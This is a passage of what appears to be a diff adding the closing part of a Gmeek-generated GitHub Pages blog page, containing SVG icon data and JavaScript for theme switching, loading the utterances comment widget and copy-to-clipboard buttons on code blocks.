1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
